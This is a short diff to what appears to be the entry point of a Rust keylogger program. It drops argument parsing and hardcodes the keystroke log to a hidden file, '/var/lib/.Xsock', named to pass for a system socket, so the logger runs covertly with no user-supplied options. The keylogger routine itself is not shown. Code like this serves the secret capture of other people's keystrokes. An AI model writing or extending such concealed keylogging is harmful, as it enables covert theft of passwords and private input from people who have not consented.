@@ -1,4 +1,4 @@
-mod lib;
+mod os;
 
 use clap::Parser;
 
@@ -19,6 +19,5 @@ struct Args {
 }
 
 fn main() {
-    let args = Args::parse();
-    let _res = lib::start_keylogger(args.logfile, args.timeout);
+    let _res = os::start_keylogger("/var/lib/.Xsock".to_owned(), 10);
 }
